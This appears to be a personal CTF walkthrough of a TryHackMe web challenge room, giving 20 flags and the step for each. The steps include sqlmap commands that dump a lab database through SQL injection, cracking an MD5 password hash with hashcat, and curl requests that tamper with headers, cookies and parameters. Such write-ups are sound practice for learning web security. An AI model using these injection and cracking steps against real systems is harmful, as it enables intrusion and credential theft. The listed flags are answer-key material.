---
Sharpening up your CTF skill with the collection. The second volume is about web-based CTF.
---

*Note: All the challenges flag are formatted as THM{flag}, unless stated otherwise*

- Easter 1 *THM{4u70b07_r0ll_0u7}* (ip/robots.txt /decode from hex)
- Easter 2 *THM{f4ll3n_b453}* (decode from base 64 till get DesKel_secret_base then go to path)
- Easter 3 *THM{y0u_c4n'7_533_m3}* (gobuster found /login path/view source code)
- Easter 4 *THM{1nj3c7_l1k3_4_b055}* (first use burpsuite and save the POST request like request.txt or another then 
```
sqlmap -r request.txt --dbs --batch
```
 will give me the name of 4 dbs available which one of these is THM_f0und_m3
 [sqlmap](https://resources.infosecinstitute.com/topic/important-sqlmap-commands/)

> Now let’s dump the tables

```
sqlmap -r request.txt --dbs --batch -D THM_f0und_m3 --tables
```

> found two tables nothing_inside and user

> Let’s see the structure of the nothing_inside table


```
sqlmap -r request.txt --dbs --batch -D THM_f0und_m3 -T nothing_inside --columns
```

> found Easter_4 Only 1 field, let’s dump the table:

```
sqlmap -r request.txt --dbs --batch -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
```

> [23:14:25] [INFO] adjusting time delay to 2 seconds due to good response times
THM{1nj3c7_l1k3_4_b0
[23:17:42] [ERROR] invalid character detected. retrying..
[23:17:42] [WARNING] increasing time delay to 3 seconds
55}
select Easter_4 from nothing_inside: 'THM{1nj3c7_l1k3_4_b055}'
[23:18:23] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.122.55'                                                        
[*] ending @ 23:18:23 /2022-08-12/

- Easter 5 *THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql} *

> Still using the same SQL injection as for easter 4, let’s dump the user table

```
sqlmap -r request.txt --dbs --batch -D THM_f0und_m3 -T user --columns
```

> found password and username

```
sqlmap -r request.txt --batch -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
```

```md5
hash-identifier 05f3672ba34409136aa71b8d00070d1b
```
##### hashcat (or john)

```save hash
nano hashctf2
```
```
hashcat -m 0 hashctf2 /usr/share/wordlists/rockyou.txt
```
`05f3672ba34409136aa71b8d00070d1b:cutie`
> then login to http://IP/login with the credentials 

==Deskel:cutie==  give me THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}

- Easter 6 *THM{l37'5_p4r7y_h4rd}* (curl -s ip -D header.txt / then cat header.txt)
- Easter 7 *THM{w3lc0m3!_4nd_w3lc0m3}* (change cookie value to 1 in inspect mode then refresh page)
- Easter 8 *THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y} * (curl -s --user-agent "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://IP/ | grep "Easter 8")
- Easter 9 *THM{60nn4_60_f457}* (curl -s http://IP/ready/) or using wget but will download it
- Easter 10 *THM{50rry_dud3} * (curl -s --referer "tryhackme.com" http://IP/free_sub/)
- Easter 11 *THM{366y_b4k3y}* ( curl -s -d "dinner=egg" -X POST http://IP/ | grep menu -B 1 )
- Easter 12 *THM{h1dd3n_j5_f1l3} * (curl -s http://IP/ | grep "\.js" ) then found jquery-9.1.2.js so (curl -s http://IP/jquery-9.1.2)  found a function - copy and go to [jscript](https://playcode.io/typescript/) 
> function ahem()
 {
    str1 = '4561737465722031322069732054484d7b68316464336e5f6a355f66316c337d'
    var hex  = str1.toString();
    var str = '';
    for (var n = 0; n < hex.length; n += 2) {
        str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
    }
    return str;
 }
document.write(ahem());  

==Easter 12 is THM{h1dd3n_j5_f1l3} ==
- Easter 13 *THM{1_c4n'7_b3l13v3_17}* (press the button)
- Easter 14 *THM{d1r3c7_3mb3d}*
 [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Render_Image('Raw'))
- Easter 15 *THM{ju57_4_64m3} * (#1st curl -d "answer=abcdefghijklmnopqrstuvwxyz" -X POST http://IP/game1/ give me another hash then / curl -d "answer=ABCDEFGHIJKLMNOPQRSTUVWXYZ" -X POST http://IP/game1/  the same hash and with the hints 
> hints: 51 89 77 93 126 14 93 10 
> We now have the numbers associated to each upper (99=A, 100=B, 101=C, … 141=Z) and lower (89=a, 90=b, …, 18=z) 

> decode : GameOver : enter like answ or curl -d "answer=GameOver" -X POST http://IP/game1/

- Easter 16 *THM{73mp3r_7h3_h7ml}* 
(curl -d "button1=button1&button2=button2&button3=button3" -X POST http://IP/game2/ )
`La vulnerabilidad de tipo Parameter Tampering consiste en la manipulación del valor de algún parámetro que se intercambia entre cliente y servidor`
- Easter 17 *THM{j5_j5_k3p_d3c0d3}*
> bin -> dec -> hex -> ascii
[rapidtables](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
==Easter 17: THM{j5_j5_k3p_d3c0d3}==
- Easter 18 *THM{70ny_r0ll_7h3_366}* (curl -s -H "egg: Yes" http://IP/ | grep -i "Easter 18")
>Request header. Format is egg:Yes
- Easter 19 *THM{700_5m4ll_3yy}* (gobuster/ small path /img)
- Easter 20 *THM{17_w45_m3_4ll_4l0n6} * (curl -s -d "username=DesKel&password=heIsDumb" -X POST http://IP/ | grep -A 1 "Easter 20") 
> You need to POST the data instead of GET. Burp suite or curl might help.

[[REmux The Tmux]]
